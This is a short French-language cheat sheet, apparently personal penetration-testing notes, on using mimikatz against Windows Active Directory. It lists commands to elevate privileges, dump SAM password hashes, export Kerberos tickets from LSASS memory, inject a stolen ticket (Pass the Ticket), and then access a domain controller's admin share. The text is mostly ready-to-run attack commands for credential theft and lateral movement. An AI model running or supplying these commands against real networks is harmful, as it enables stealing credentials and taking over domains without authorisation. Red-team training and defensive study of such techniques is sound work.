Toujours executer ses commandes avant toutes action avec mimikatz

```c
privilage::debug
token::elevate
```

Dump Hash

```c
lsadump::sam
lsadump::sam /path
```

---
##### Pass The Ticket

Passer le ticket fonctionne en vidant le TGT de la mémoire LSASS de la machine qui est un processus de mémoire qui stocke les informations d'identification sur un serveur d'annuaire actif et peut stocker le ticket Kerberos avec d'autres types d'informations d'identification pour agir en tant que contrôleur d'accès et accepter ou rejeter les informations d'identification fournies.

Vous pouvez vider les tickets Kerberos de la mémoire LSASS tout comme vous pouvez vider les hachages. Lorsque vous videz les tickets avec mimikatz, cela nous donnera un ticket `.kirbi` qui peut être utilisé pour obtenir l'administrateur de domaine si un ticket d'administrateur de domaine se trouve dans la mémoire LSASS.

Vous pouvez penser à une attaque Pass the Ticket comme si la réutilisation d'un ticket existant ne créait ou ne détruisait aucun ticket ici, réutilisait simplement un ticket existant d'un autre utilisateur sur le domaine et usurpait l'identité de ce ticket.

```c
sekurlsa::tickets /export
kerberos::ptt <file.kirbi>

# Dans un nouveau cmd
misc::cmd
```

Ici, nous vérifions simplement que nous avons réussi à usurper l'identité du ticket en répertoriant nos tickets en cache.

```c
klist
```

Pour acceder a un machine du domaine:

```c
dir \\dc-ip\admin$
```


